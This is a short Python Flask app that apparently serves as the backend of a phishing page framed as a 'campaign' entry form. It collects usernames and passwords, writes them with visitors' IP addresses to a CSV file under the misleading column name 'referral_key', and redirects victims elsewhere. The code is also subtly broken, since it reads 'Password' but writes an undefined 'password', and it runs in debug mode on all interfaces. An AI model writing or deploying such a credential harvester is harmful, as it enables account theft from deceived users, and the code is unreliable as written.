import os
import csv
from datetime import datetime
from flask import Flask, render_template, request, jsonify
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config["SECRET_KEY"] = os.getenv("SECRET_KEY", "dev-secret-key-123")
REDIRECT_URL = os.getenv("REDIRECT_URL", "https://example.com")
CSV_FILE = "submissions.csv"

# Initialize CSV file with headers if it doesn't exist
if not os.path.exists(CSV_FILE):
    with open(CSV_FILE, mode="w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "username", "referral_key", "ip_address"])

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/api/submit", methods=["POST"])
def handle_submission():
    data = request.get_json(silent=True) or {}
    username = data.get("username", "").strip().lstrip("@")
    Password = data.get("Password", "").strip()

    if not username:
        return jsonify({"success": False, "message": "Username zaroori hai."}), 400

    # Basic sanitized log
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

    with open(CSV_FILE, mode="a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, username, password, ip])

    return jsonify({
        "success": True,
        "message": "Campaign entry registered!",
        "redirect_url": REDIRECT_URL
    }), 200

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
